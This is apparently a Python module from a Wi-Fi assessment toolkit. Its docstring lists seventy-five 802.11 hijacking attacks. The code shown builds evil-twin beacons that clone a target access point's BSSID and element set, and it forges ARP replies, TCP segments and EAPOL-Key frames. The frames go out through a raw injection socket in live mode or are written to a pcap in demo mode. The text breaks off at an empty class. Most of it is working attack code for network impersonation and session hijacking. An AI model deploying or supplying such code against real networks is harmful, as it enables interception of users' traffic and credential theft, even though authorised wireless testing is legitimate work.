# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Hijackers: seventy-five attacks that put somebody else's identity on the air.

The BLE waves answer *can a device be impersonated*.  This one is the same question
asked of the 802.11 side of an assessment, where the identity is a BSSID, an SSID, a
station's address, a client's session or a credential the network hands out — and where
"impersonated" means a client, an access point or a RADIUS server believes a frame that
came off our radio.

Six families, and the family is what the finding is about:

* **twin infrastructure** (``twin_*``) — a second access point wearing the target's
  identity, one axis at a time: its address, its element set, its RSN, its PMF
  capability, its mobility domain, its hidden name, or nothing but its probe responses.
  Each attack changes *one* thing a client could use to tell the two apart and reports
  whether anything was left.
* **client impersonation** (``client_*``) — frames in a station's name: an association as
  a client the AP has seen, a reassociation with a forged 802.11r RIC, a TDLS teardown
  between two other stations, a null data frame that puts somebody else's link to sleep.
* **steering** (``steer_*``) — the management frames that *move* a client: BTM requests,
  beacon-report requests, neighbour reports naming our twin, FILS discovery, quiet and
  WNM-sleep elements.  Nothing here needs the client to associate with us first.
* **session hijack** (``session_*``) — what happens after association: forged ARP and DNS
  answers, a TCP reset in somebody else's stream, a replayed message 3, an A-MSDU present
  bit, a forged Block Ack agreement, an SA Query the client never answers.
* **captive portal and credentials** (``portal_*``) — the portal a hijacker shows instead
  of the real network: the clone, the wildcard DNS that pushes clients at it, the WISPr
  and ANQP answers, the certificate, the credential in front of it.
* **enterprise** (``enterprise_*``) — 802.1X where the *server* is the identity being
  stolen: a rogue RADIUS with the real realm, a PEAP relay, an EAP-TLS certificate for
  somebody else's name, GTC, TTLS/PAP, MSCHAPv2, and the downgrades between them.

Every attack follows one shape, because that shape is the honest one: build the frames
from the target's own data, write the capture, then decode it with the toolkit's own
parsers and report what the bytes said.  A hijacker that cannot show its evidence in a
capture is a hijacker that did not work.
"""

from __future__ import annotations

import struct
import time
from typing import Any, Dict, List, Optional, Sequence, Tuple

from .. import ies as iecodec
from ..models import AccessPoint, Attempt
from .. import netproto as np
from ..pcap import iter_frames
from ..rawtx import (build_action, build_arp_reply, build_auth_request, build_btm_request,
                     build_data, build_disassoc, build_eapol_start,
                     build_null_data, build_probe_request, build_reassoc_request,
                     build_rm_beacon_request, build_sa_query,
                     build_ssid_confusion_beacon, build_tdls_teardown, spoofed_mac)
from ..synth import (PCAP_HEADER, RADIOTAP, build_action_frame, build_assoc_response,
                     build_beacon, build_eapol_logoff, build_probe_response, build_qos_data_frame,
                     country_element, extended_capabilities, he_capabilities,
                     ht_capabilities, interworking_element, mobility_domain,
                     neighbour_report_element, rm_enabled_capabilities, vht_capabilities, wmm_parameter_element)
from .base import AttackContext, AttackOutcome
from .lure import _LureAttack, management_frames, ssid_of_ies

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY"]

#: an 802.11 data frame's LLC/SNAP header, and the ethertypes the portal family reads
LLC_SNAP = b"\xaa\xaa\x03\x00\x00\x00"
ETHERTYPE_IP = 0x0800
ETHERTYPE_ARP = 0x0806

#: management subtypes this module builds or reads
SUBTYPE_ASSOC_REQ = 0
SUBTYPE_ASSOC_RESP = 1
SUBTYPE_REASSOC_REQ = 2
SUBTYPE_PROBE_REQ = 4
SUBTYPE_PROBE_RESP = 5
SUBTYPE_BEACON = 8
SUBTYPE_DISASSOC = 10
SUBTYPE_AUTH = 11
SUBTYPE_ACTION = 13


# --------------------------------------------------------------------------- #
# capture readers
#
# The attacks are graded on what a capture says, so the reading half is written
# first and shared: every one of the seventy-five uses these, and a test asserts
# they decode what the builders wrote.
# --------------------------------------------------------------------------- #

def radiotap(signal: int = -42, channel: int = 6) -> bytes:
    """A radiotap header carrying the antenna signal (which is what a client weighs).

    The synth writer emits a header with no fields at all — enough for a parser, but a
    twin's whole advantage is that it is *closer* than the real AP, and a capture that
    cannot show the signal cannot show that advantage.
    """
    return (bytes([0x00, 0x00, 0x09, 0x00, 0x20, 0x00, 0x00, 0x00])
            + bytes([signal & 0xFF]))


def write_capture(path: str, frames: Sequence[bytes], signal: int = -42,
                  signals: Optional[Sequence[int]] = None) -> str:
    """Write frames with a signal-bearing radiotap header: a capture with an RSSI.

    ``signals`` overrides the level per frame, which is how the attack that claims to be
    *closer* than the real AP proves it: the comparison is read back out of the capture
    rather than asserted from the number the caller passed in.  Frames from the ``rawtx``
    builders arrive with a radiotap header of their own (they are written for a live
    injection socket), so exactly one is kept.
    """
    buffer = bytearray(PCAP_HEADER)
    base = int(time.time())
    for index, frame in enumerate(frames):
        level = signal if signals is None else int(signals[min(index, len(signals) - 1)])
        body = frame[8:] if frame[:8] == RADIOTAP else frame
        packet = radiotap(level) + body
        buffer += struct.pack("<IIII", base, index * 1000, len(packet), len(packet))
        buffer += packet
    with open(path, "wb") as handle:
        handle.write(bytes(buffer))
    return path


def signal_of(path: str) -> Dict[str, int]:
    """``{bssid: rssi}`` from the radiotap headers of a capture.

    A radiotap header is the only place a capture records how loudly a frame arrived,
    and the field this reads (``DBM_ANTSIGNAL``) is the whole basis of the attack that
    claims a signal advantage — so it is parsed rather than assumed.
    """
    found: Dict[str, int] = {}
    for _ts, buf, start, length in iter_frames(str(path)):
        if length < 24 or start < 9:
            continue
        control = buf[start]
        if control & 0x03:
            continue                                    # not version 0
        if (control & 0x0C) == 0x04:
            continue                                    # a control frame has no BSSID here
        bssid = bytes(buf[start + 16:start + 22]).hex(":")
        if bssid == "ff:ff:ff:ff:ff:ff" or bssid == "00:00:00:00:00:00":
            continue                                    # a broadcast transmitter is nobody
        header = bytes(buf[start - 9:start])
        if len(header) < 9 or header[0] != 0x00:
            continue
        if int.from_bytes(header[2:4], "little") != 9:
            continue
        present = int.from_bytes(header[4:8], "little")
        if not present & 0x20:                          # no DBM_ANTSIGNAL present
            continue
        found[bssid] = int.from_bytes(bytes([header[8]]), "big", signed=True)
    return found


def frame_census(path: str) -> Dict[str, Any]:
    """How many frames of each type a capture holds — the "was anything sent" check."""
    census = {"management": 0, "control": 0, "data": 0, "by_subtype": {},
              "transmitters": {}}
    for _ts, buf, start, length in iter_frames(str(path)):
        if length < 10:
            continue
        control = buf[start]
        kind = control & 0x03
        subtype = (control >> 4) & 0x0F
        key = "control" if kind == 1 else ("data" if kind == 2 else "management")
        census[key] += 1
        census["by_subtype"][str(subtype)] = census["by_subtype"].get(str(subtype), 0) + 1
        if length >= 16:
            transmitter = bytes(buf[start + 10:start + 16]).hex(":")
            census["transmitters"][transmitter] = \
                census["transmitters"].get(transmitter, 0) + 1
    return census


def beacons(path: str) -> List[Dict[str, Any]]:
    """Every beacon and probe response, with its elements decoded.

    ``decode_ies`` is the same decoder the survey and the IE audit use, so a twin that
    claims to be identical to its target is compared element by element by the code that
    grades the claim.
    """
    rows: List[Dict[str, Any]] = []
    for _ts, buf, start, length in iter_frames(str(path)):
        if length < 36:
            continue
        control = buf[start]
        if control & 0x03 or (control >> 2) & 0x03 != 0:
            continue
        subtype = (control >> 4) & 0x0F
        if subtype not in (SUBTYPE_BEACON, SUBTYPE_PROBE_RESP):
            continue
        body = bytes(buf[start + 36:start + length])
        facts = iecodec.decode_ies(iecodec.parse_ies(body))
        facts.update({
            "subtype": "beacon" if subtype == SUBTYPE_BEACON else "probe response",
            "bssid": bytes(buf[start + 16:start + 22]).hex(":"),
            "transmitter": bytes(buf[start + 10:start + 16]).hex(":"),
            "destination": bytes(buf[start + 4:start + 10]).hex(":"),
            "elements": sorted(facts.get("elements") or [],
                               key=lambda item: item.get("id", item.get("tag", 0))),
            "ssid": facts.get("ssid") or ssid_of_ies(body),
        })
        rows.append(facts)
    return rows


def element_tags(path: str) -> List[Dict[str, Any]]:
    """``{tag, value}`` for every element in the capture's beacons, in order."""
    out: List[Dict[str, Any]] = []
    for row in beacons(path):
        for element in row["elements"]:
            tag = int(element.get("id", element.get("tag", 0)))
            out.append({"tag": tag, "length": int(element.get("length") or 0),
                        "value": str(element.get("value") or ""),
                        "bssid": row["bssid"]})
    return out


def data_rows(path: str) -> List[Dict[str, Any]]:
    """Data frames with their LLC/SNAP payload: what a session hijack rides inside."""
    rows: List[Dict[str, Any]] = []
    for _ts, buf, start, length in iter_frames(str(path)):
        if length < 24:
            continue
        control = buf[start]
        if control & 0x03 or (control >> 2) & 0x03 != 0x02:
            continue
        # the LLC/SNAP header is found rather than assumed: the builders differ on
        # whether a QoS control field is present, and a reader that assumes reads the
        # ethertype out of the middle of an address
        payload = bytes(buf[start + 20:start + length])
        at = payload.find(LLC_SNAP)
        ethertype = int.from_bytes(payload[at + 6:at + 8], "big") if at >= 0 else 0
        rows.append({
            "subtype": (control >> 4) & 0x0F,
            "to_ds": bool(control & 0x01), "from_ds": bool(control & 0x02),
            "src": bytes(buf[start + 10:start + 16]).hex(":"),
            "bssid": bytes(buf[start + 16:start + 22]).hex(":"),
            "destination": bytes(buf[start + 4:start + 10]).hex(":"),
            "ethertype": ethertype,
            "payload": payload,
            "body": payload[at + 8:] if at >= 0 else payload,
        })
    return rows


def text_rows(path: str) -> List[Dict[str, Any]]:
    """The printable text inside data frames — portals, HTTP, DHCP hostnames, DNS."""
    out: List[Dict[str, Any]] = []
    for row in data_rows(path):
        body = row["body"]
        printable = bytes(byte if 32 <= byte < 127 else 0x2E for byte in body[:512])
        text = printable.decode("latin-1")
        if text and text.strip("."):
            out.append({"src": row["src"], "destination": row["destination"],
                        "ethertype": row["ethertype"], "text": text})
    return out


def eapol_rows(path: str) -> List[Dict[str, Any]]:
    """EAPOL-Key frames: the replay counters and key information bits a replay needs."""
    rows: List[Dict[str, Any]] = []
    for row in data_rows(path):
        body = row["body"]
        if len(body) < 6 or body[0] != 0x02 or body[1] != 0x03:
            continue                                    # version 2, type 3 = EAPOL-Key
        key_info = int.from_bytes(body[5:7], "big") if len(body) >= 7 else 0
        rows.append({
            "src": row["src"], "destination": row["destination"],
            "bssid": row["bssid"], "key_info": key_info,
            "from_ap": bool(key_info & 0x0008), "install": bool(key_info & 0x0040),
            "ack": bool(key_info & 0x0080), "secure": bool(key_info & 0x0200),
            "replay": int.from_bytes(body[9:17], "big") if len(body) >= 17 else 0,
            "message": (3 if (key_info & 0x0080) and (key_info & 0x0040) and
                        (key_info & 0x0200) else (1 if key_info & 0x0080 else 2)),
        })
    return rows


def action_rows(path: str) -> List[Dict[str, Any]]:
    """Action frames decoded far enough to name the category and the action."""
    names = {0: "spectrum management", 1: "QoS", 2: "DLS", 3: "block ack", 4: "public",
             5: "radio measurement", 6: "fast BSS transition", 7: "HT", 8: "SA query",
             10: "WNM", 11: "unprotected WNM", 13: "FILS", 14: "TDLS", 20: "protected HT"}
    rows: List[Dict[str, Any]] = []
    for _ts, buf, start, length in iter_frames(str(path)):
        if length < 26:
            continue
        control = buf[start]
        if control & 0x03 or (control >> 2) & 0x03 != 0:
            continue
        if (control >> 4) & 0x0F != SUBTYPE_ACTION:
            continue
        category, action = buf[start + 24], buf[start + 25]
        rows.append({"category": category, "action": action,
                     "category_name": names.get(category, f"category {category}"),
                     "bssid": bytes(buf[start + 16:start + 22]).hex(":"),
                     "destination": bytes(buf[start + 4:start + 10]).hex(":"),
                     "source": bytes(buf[start + 10:start + 16]).hex(":"),
                     "payload": bytes(buf[start + 26:start + length])})
    return rows


def arp_rows(path: str) -> List[Dict[str, Any]]:
    """ARP replies: who claimed which address, and to whom."""
    rows: List[Dict[str, Any]] = []
    for row in data_rows(path):
        body = row["body"]
        if row["ethertype"] != ETHERTYPE_ARP or len(body) < 28:
            continue
        rows.append({
            "op": int.from_bytes(body[6:8], "big"),
            "sender_mac": body[8:14].hex(":"), "sender_ip": ".".join(str(b) for b in body[14:18]),
            "target_mac": body[18:24].hex(":"), "target_ip": ".".join(str(b) for b in body[24:28]),
            "src": row["src"], "bssid": row["bssid"],
        })
    return rows


def ip_rows(path: str) -> List[Dict[str, Any]]:
    """IPv4 datagrams inside data frames: protocol, addresses and ports."""
    rows: List[Dict[str, Any]] = []
    for row in data_rows(path):
        body = row["body"]
        if row["ethertype"] != ETHERTYPE_IP or len(body) < 20:
            continue
        ihl = (body[0] & 0x0F) * 4
        protocol = body[9]
        entry: Dict[str, Any] = {
            "protocol": protocol,
            "src": ".".join(str(b) for b in body[12:16]),
            "dst": ".".join(str(b) for b in body[16:20]),
            "ttl": body[8], "src_mac": row["src"], "bssid": row["bssid"],
        }
        if protocol in (6, 17) and len(body) >= ihl + 4:
            entry["src_port"] = int.from_bytes(body[ihl:ihl + 2], "big")
            entry["dst_port"] = int.from_bytes(body[ihl + 2:ihl + 4], "big")
            if protocol == 6 and len(body) >= ihl + 14:
                entry["flags"] = body[ihl + 13]
                entry["sequence"] = int.from_bytes(body[ihl + 4:ihl + 8], "big")
        rows.append(entry)
    return rows


def stations_in(path: str) -> List[str]:
    """Every station address that transmitted in a capture (the client list)."""
    found: List[str] = []
    for _ts, buf, start, length in iter_frames(str(path)):
        if length < 16:
            continue
        address = bytes(buf[start + 10:start + 16]).hex(":")
        if address not in found:
            found.append(address)
    return found


def _element_key(element: Dict[str, Any]) -> Tuple[int, int]:
    """``(id, length)`` for one decoded element: the decoder's own two facts."""
    return (int(element.get("id", element.get("tag", 0))),
            int(element.get("length") or 0))


def _twin_address(bssid: str) -> str:
    """Our twin's address: the target's, one bit over (locally administered).

    Deriving it from the target keeps the run reproducible and makes the report
    readable — the twin is visibly *that network's* address with the local bit set, and
    a client that compares addresses byte by byte will see the difference, which is the
    point of the attack that reports it.
    """
    raw = bytearray(int(part, 16) for part in (bssid or "aa:bb:cc:00:00:01").split(":"))
    raw[0] |= 0x02
    return ":".join(f"{byte:02x}" for byte in raw)


#: the address plan the bridge-side attacks assume: the gateways and clients of the
#: network the AP bridges to.  A real engagement reads them off the subnet, and the
#: report says which ones were assumed.
GATEWAY = "192.168.1.1"
CLIENT_SUBNET = "192.168.1."


def _gateway_of(ap: AccessPoint) -> str:
    """The gateway an access point hands out: its own address where the scan saw one."""
    return str(getattr(ap, "ip", "") or "") or GATEWAY


def _client_ip(station: str) -> str:
    """A deterministic address for a station: the last octet of its MAC, on the subnet."""
    octets = [int(part, 16) for part in str(station).split(":") if part]
    last = octets[-1] if octets else 20
    return CLIENT_SUBNET + str(20 + (last % 200))


def _arp_bytes(sender_mac: str, sender_ip: str, target_mac: str, target_ip: str,
               op: int = 2) -> bytes:
    """An ARP payload: the reply and the gratuitous announcement differ by one field."""
    return (struct.pack(">HHBBH", 1, ETHERTYPE_IP, 6, 4, op)
            + bytes(int(part, 16) for part in sender_mac.split(":"))
            + np.ipv4_bytes(sender_ip)
            + bytes(int(part, 16) for part in target_mac.split(":"))
            + np.ipv4_bytes(target_ip))


def _ipv4_packet(source: str, destination: str, payload: bytes, protocol: int,
                 ttl: int = 64) -> bytes:
    """An IPv4 header with a correct checksum in front of a transport payload."""
    header = struct.pack(">BBHHHBBH", 0x45, 0, 20 + len(payload), 0x4321, 0, ttl,
                         protocol, 0)
    header += np.ipv4_bytes(source) + np.ipv4_bytes(destination)
    checksum = np.checksum(header)
    header = header[:10] + struct.pack(">H", checksum) + header[12:]
    return header + payload


def _tcp_segment(source: str, destination: str, source_port: int, dest_port: int,
                 sequence: int = 0, acknowledgement: int = 0, flags: int = 0x18,
                 window: int = 65535, payload: bytes = b"") -> bytes:
    """A TCP segment with a checksum computed over the pseudo-header, as the stack does.

    The pseudo-header is the part most hand-written injections get wrong, and a segment
    with a wrong checksum is dropped by every receiver — which makes a "successful"
    attack report a lie.
    """
    header = struct.pack(">HHIIBBHHH", source_port, dest_port, sequence, acknowledgement,
                         (5 << 4), flags & 0xFF, window, 0, 0)
    pseudo = (np.ipv4_bytes(source) + np.ipv4_bytes(destination)
              + struct.pack(">BBH", 0, 6, len(header) + len(payload)))
    checksum = np.checksum(pseudo + header + payload)
    header = header[:16] + struct.pack(">H", checksum) + header[18:]
    return header + payload


def _eapol_key(key_info: int, replay: int, nonce: bytes) -> bytes:
    """A complete EAPOL-Key frame: the 4-byte EAPOL header plus the key descriptor.

    ``synth._kmd`` builds the *key descriptor* (what a capture's analysis reads); the
    wire frame has an EAPOL header in front of it, and an attack that forgets it sends
    bytes no authenticator parses — which is why this exists.
    """
    from ..synth import _kmd
    descriptor = _kmd(key_info, replay, nonce)
    return bytes([0x02, 0x03]) + struct.pack(">H", len(descriptor)) + descriptor


def _first_station(ap: AccessPoint) -> str:
    """A station address from the target's client list (or a deterministic stand-in)."""
    clients = list(getattr(ap, "clients", []) or [])
    if clients:
        first = clients[0]
        return getattr(first, "mac", None) or str(first)
    return spoofed_mac(len(getattr(ap, "bssid", "")) + 7)


# --------------------------------------------------------------------------- #
# the shared machinery
# --------------------------------------------------------------------------- #

class _Hijack(_LureAttack):
    """Build frames wearing somebody else's identity, then read the capture back.

    The live path is :class:`~wifipilot.attacks.lure._LureAttack`'s: airodump-ng writes
    the capture, the raw socket transmits the frames, and ``observe`` decides what came
    back.  The demo path differs in exactly one way that matters — instead of an empty
    capture it writes the frames through :func:`write_capture`, so ``observe`` is run
    against bytes this process built with the same builders a live run would use, and
    the decoders under test are the ones that will read the real thing.
    """

    requires = ("airodump",)
    needs_injection = True
    description = ("Build frames wearing somebody else's identity, then read the capture "
                   "back and report only what it shows.")

    def __init_subclass__(cls, **kwargs: Any) -> None:
        """Take the description from the class's own one-line docstring.

        Every attack in this module states what it does in the first line of its
        docstring, and the catalogue, the CLI, the docs and the planner all show a
        ``description``.  Keeping the prose in one place means the two cannot drift.
        """
        super().__init_subclass__(**kwargs)
        if not cls.__dict__.get("description"):
            first = (cls.__doc__ or "").strip().splitlines()
            if first and first[0].strip():
                cls.description = first[0].strip()
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE",
                  "WPA-ENTERPRISE", "WPA2-ENTERPRISE", "ENTERPRISE")
    max_seconds = 24.0
    observe_seconds = 4.0
    frames_per_round = 2
    #: which of the six families this attack belongs to (the report quotes it)
    family = "twin"
    finding_severity = "medium"
    #: the signal our twin claims, in dBm — stronger than every demo AP on purpose
    twin_signal = -30
    #: the AKM the twin advertises (``"psk"``/``"sae"``/``"owe"``/``"8021x"``)
    twin_akm = "psk"
    #: whether the twin advertises PMF (the attack that strips it says False)
    twin_pmf = True
    #: some attacks wear the target's *own* address, not a neighbouring one
    clone_address = False
    #: the WMM parameter element to advertise (``b""`` for a network without WMM)
    twin_wmm: bytes = b""

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        """Remember the target, then run the lure machinery."""
        self._ap = ap
        self._bssid = ap.bssid
        return super().run(ctx, ap)

    def stations(self, ctx: AttackContext) -> List[str]:
        """The stations the targeted network has: the demo radio knows, live mode guesses.

        A client-impersonation attack needs an address the AP has actually seen — the
        client list the scan built, the demo radio's neighbours, or (last resort) a
        locally-administered stand-in, which the report then says is a stand-in.
        """
        known = list(getattr(self._ap, "clients", None) or [])
        if known:
            return [str(mac) for mac in known][:8]
        radio = getattr(ctx, "radio", None)
        demo_ap = radio.find(ap_bssid(self._bssid)) if radio else None
        if demo_ap is not None and getattr(demo_ap, "clients", None):
            found = [client.mac for client in demo_ap.clients if getattr(client, "mac", "")]
            if found:
                return found[:8]
        return [_first_station(self._ap)]

    def target_akm(self, ap: AccessPoint) -> str:
        """The AKM to put in the reference beacon: what the scan says the target uses."""
        auth = (getattr(ap, "auth", "") or "").upper()
        if "SAE" in auth:
            return "sae"
        if "MGT" in auth or "802.1X" in auth or "ENTERPRISE" in auth:
            return "8021x"
        if "OWE" in auth:
            return "owe"
        return "psk"

    def reference_beacon(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        """The target's own beacon, as the scan describes it: the thing to be equal to."""
        return build_beacon(ssid=ap.essid or "hidden", bssid=ap.bssid,
                            channel=ap.channel or 6, include_rsn=bool(ap.privacy),
                            akm=self.target_akm(ap), pmf=bool(getattr(ap, "pmf", False)),
                            extra_ies=self.twin_elements(ap, ctx))

    def twin_pair(self, ctx: AttackContext, ap: AccessPoint,
                  **overrides: Any) -> List[bytes]:
        """Both beacons: the twin's and the target's, which is what the diff reads."""
        return [self.twin_beacon(ctx, ap, **overrides),
                self.reference_beacon(ctx, ap)]

    def compare(self, observed: Dict[str, Any]) -> Dict[str, Any]:
        """Diff the twin's beacon against the target's, element by element.

        This is the whole claim of the twin family: *these* are the axes on which the
        two are identical and *that* is the one that gives us away.  The comparison is
        made on decoded elements, not on the bytes we meant to write.
        """
        rows = observed.get("beacons") or []
        twin_address = self.twin_bssid(self._ap)
        twins = [row for row in rows if row["bssid"] == twin_address]
        twin = twins[0] if twins else None
        target = next((row for row in rows if row["bssid"] == ap_bssid(self._bssid)
                       and row is not twin), None) or twin
        if twin is None or target is None:
            return {"comparable": False, "twin_seen": twin is not None,
                    "target_seen": target is not None}
        twin_tags = [_element_key(item) for item in twin["elements"]]
        target_tags = [_element_key(item) for item in target["elements"]]
        twinset, targetset = set(twin_tags), set(target_tags)
        return {
            "comparable": True,
            "ssid_equal": twin["ssid"] == target["ssid"],
            "channel_equal": twin["channel"] == target["channel"],
            "rsn_equal": (twin["rsn"] or {}) == (target["rsn"] or {}),
            "pmf_equal": (twin["pmf_capable"], twin["pmf_required"]) ==
                         (target["pmf_capable"], target["pmf_required"]),
            "elements_in_both": sorted(tag for tag, _ in (twinset & targetset)),
            "elements_only_in_twin": sorted(tag for tag, _ in (twinset - targetset)),
            "elements_only_in_target": sorted(tag for tag, _ in (targetset - twinset)),
            "element_count": [len(twin_tags), len(target_tags)],
            "twin_address": twin["bssid"], "target_address": target["bssid"],
        }

    # -- the twin's own elements ------------------------------------------ #
    def twin_bssid(self, ap: AccessPoint) -> str:
        """Our address: a neighbour of the target's, or the target's own."""
        return ap.bssid if self.clone_address else _twin_address(ap.bssid)


    def twin_elements(self, ap: AccessPoint, ctx: AttackContext) -> bytes:
        """The information elements the twin advertises: the target's, by default."""
        elements = b""
        elements += country_element()
        elements += extended_capabilities(bss_transition=bool(ap.privacy))
        elements += ht_capabilities()
        if (ap.channel or 0) > 14:
            elements += vht_capabilities()
        elements += he_capabilities()
        elements += self.twin_wmm or wmm_parameter_element()
        elements += rm_enabled_capabilities()
        return elements

    def twin_beacon(self, ctx: AttackContext, ap: AccessPoint, **overrides: Any) -> bytes:
        """The twin's beacon: the target's name, a derived address, our chosen posture."""
        kwargs: Dict[str, Any] = {
            "ssid": ap.essid or "hidden",
            "bssid": self.twin_bssid(ap),
            "channel": ap.channel or 6,
            "include_rsn": bool(ap.privacy),
            "akm": self.twin_akm,
            "pmf": self.twin_pmf,
            "extra_ies": self.twin_elements(ap, ctx),
        }
        kwargs.update(overrides)
        return build_beacon(**kwargs)

    def twin_probe_response(self, ctx: AttackContext, ap: AccessPoint,
                            station: str = "ff:ff:ff:ff:ff:ff", **overrides: Any) -> bytes:
        """The same lie, aimed at one station's probe request."""
        kwargs: Dict[str, Any] = {
            "ssid": ap.essid or "hidden",
            "bssid": self.twin_bssid(ap),
            "station": station,
            "channel": ap.channel or 6,
            "extra_ies": self.twin_elements(ap, ctx),
            "include_rsn": bool(ap.privacy),
            "akm": self.twin_akm,
        }
        kwargs.update(overrides)
        return build_probe_response(**kwargs)

    # -- the run ---------------------------------------------------------- #
    def twin_signals(self, ctx: AttackContext, ap: AccessPoint) -> Optional[Sequence[int]]:
        """The per-frame signal levels, when the attack is about being heard louder."""
        return None

    def demo_capture(self, ctx: AttackContext, ap: AccessPoint, path: str) -> str:
        """Write the frames this attack would transmit, so the reading half is tested."""
        return write_capture(path, list(self.frames(ctx, ap)), signal=self.twin_signal,
                             signals=self.twin_signals(ctx, ap))

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        """The default reading: what we sent, and how the world answered.

        Every reader in this module runs over the capture here, because the families
        overlap — a steering attack reads the action frame it sent *and* the probe
        requests that followed, and a portal attack reads an HTTP body out of a data
        frame.  One walk over the same bytes for all of them is also the cheapest.
        """
        return {"census": frame_census(path), "beacons": beacons(path),
                "stations": stations_in(path), "signals": signal_of(path),
                "arp": arp_rows(path), "ip": ip_rows(path), "text": text_rows(path),
                "actions": action_rows(path), "eapol": eapol_rows(path)}

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        census = observed.get("census") or {}
        sent = sum(int(census.get(key, 0)) for key in ("management", "control", "data"))
        return {"detail": (f"{sent} frame(s) with the identity of {ap.display_name} on "
                           f"channel {ap.channel or 6}; the capture holds what answered"),
                "extra": {"family": self.family, "census": census}}

    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        """The demo run: build the frames, read them back, report the reading.

        Shorter than the lure base's three-step progress (the tests run seventy-five of
        these) but the same three moves: transmit, capture, decode.
        """
        path = ctx.artifact_path(self.name, ap, ".pcap")
        started = time.time()
        for step in (1, 2):
            ctx.progress(f"{self.label} on {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=step * 40,
                         detail="impersonating · simulation")
            time.sleep(0.05)
        self.demo_capture(ctx, ap, path)
        observed = self.observe(ctx, ap, path)
        report = self.interpret(ctx, ap, observed)
        return self._finish(ctx, ap, attempt, self.frames_per_round, observed, report,
                            time.time() - started, True)

def ap_bssid(value: str) -> str:
    """A BSSID as the demo radio spells it (lower case, colons)."""
    return ":".join(part.lower() for part in str(value or "").split(":"))


# --------------------------------------------------------------------------- #
# family one: twin infrastructure
#
# Every attack here builds *two* beacons: our twin's, and the target's as the scan
# described it.  The report is the difference between them, which is the only honest
# way to say what a client can and cannot use to tell them apart.
# --------------------------------------------------------------------------- #

class _Twin(_Hijack):
    """The shape both halves of the twin family share."""

    family = "twin"
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    finding_severity = "high"

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        return self.twin_pair(ctx, ap)

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        diff = self.compare(observed)
        signals = observed.get("signals") or {}
        if not diff.get("comparable"):
            return {"detail": (f"the twin beacon of {ap.display_name} went out on channel "
                               f"{ap.channel or 6} and the capture could not be compared "
                               f"with the target's own beacon"),
                    "extra": {"family": self.family, "diff": diff}}
        same = []
        if diff["ssid_equal"]:
            same.append("the name")
        if diff["channel_equal"]:
            same.append("the channel")
        if diff["rsn_equal"]:
            same.append("the RSN")
        if diff["pmf_equal"]:
            same.append("the PMF capability")
        twin_level = signals.get(diff["twin_address"], 0)
        target_level = signals.get(ap_bssid(diff["target_address"]), 0)
        identical = f"{len(diff['elements_in_both'])} element(s) identical"
        if same:
            identical += ", and so are " + ", ".join(same)
        where = (f"the twin wears the target's own address ({diff['twin_address']})"
                 if self.clone_address else
                 f"the addresses differ in the locally-administered bit alone "
                 f"({diff['twin_address']} against the target's {diff['target_address']})")
        detail = (f"{identical}; the twin {self.discriminator()}. {where}, and the "
                  f"capture puts us at {twin_level} dBm against the target's "
                  f"{target_level} dBm")
        return {"title": self.finding_title, "severity": self.finding_severity,
                "body": self.finding_detail, "detail": detail,
                "extra": {"family": self.family, "diff": diff, "twin_level": twin_level,
                          "target_level": target_level}}

    def discriminator(self) -> str:
        """The one sentence saying which axis this attack changed."""
        return "answers probes with the target's own element set"


class TwinAddressCloneAttack(_Twin):
    """The twin wears the target's own BSSID, so no client can filter by address."""

    name = "twin_address_clone"
    label = "Twin on the target's own BSSID (address cloning)"
    clone_address = True
    tool = "wifipilot synth.py (beacon builder) + airodump-ng"
    finding_title = "This network can be cloned address for address"
    finding_detail = (
        "Nothing in an 802.11 beacon is signed.  A second radio that uses the target's "
        "BSSID, its SSID and its element set produces frames that are byte-identical to "
        "the real AP's, so a client that has never completed a handshake — and any "
        "monitoring system that only reads beacons — cannot separate the two.  What "
        "eventually differs is the link: only one of the two can complete a 4-way "
        "handshake, and only one is connected to the site's wired network.")

    def discriminator(self) -> str:
        return "wears the target's own address, so the capture cannot separate the two rows"

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        report = super().interpret(ctx, ap, observed)
        report["detail"] = (
            f"two beacons with the same address {ap.bssid} went out from two radios: "
            f"the name, the channel, the RSN and every element match, and this capture "
            f"cannot tell them apart — the only evidence of a clone is a second "
            f"transmitter on the same address, which is what a WIDS correlates")
        return report


class TwinElementCloneAttack(_Twin):
    """Clone every information element, so element fingerprinting finds nothing."""

    name = "twin_element_clone"
    label = "Twin that clones the whole element set (fingerprint collision)"
    tool = "wifipilot synth.py (element library)"
    finding_title = "Element fingerprinting does not separate this clone"
    finding_detail = (
        "The twin advertises the country element, the extended capabilities, HT/VHT/HE "
        "capabilities, WMM parameters and the radio-measurement element the target "
        "advertises.  Element sets are how a survey tool tells two same-named networks "
        "apart, and this pairing defeats it: the two element lists are identical, in "
        "order and in length.")

    def twin_elements(self, ap: AccessPoint, ctx: AttackContext) -> bytes:
        elements = super().twin_elements(ap, ctx)
        if getattr(ap, "wps", False):
            from ..synth import wps_element
            elements += wps_element(manufacturer=getattr(ap, "wps_manufacturer", ""),
                                    device_name=ap.display_name,
                                    model=getattr(ap, "wps_model", ""))
        return elements

    def reference_beacon(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        return build_beacon(ssid=ap.essid or "hidden", bssid=ap.bssid,
                            channel=ap.channel or 6, include_rsn=bool(ap.privacy),
                            akm=self.target_akm(ap), pmf=bool(getattr(ap, "pmf", False)),
                            extra_ies=self.twin_elements(ap, ctx), tsf=1024)

    def discriminator(self) -> str:
        return "carries the same elements in the same order as the target"


class TwinRsnStripAttack(_Twin):
    """A secured network, cloned open: what a client does with no RSN at all."""

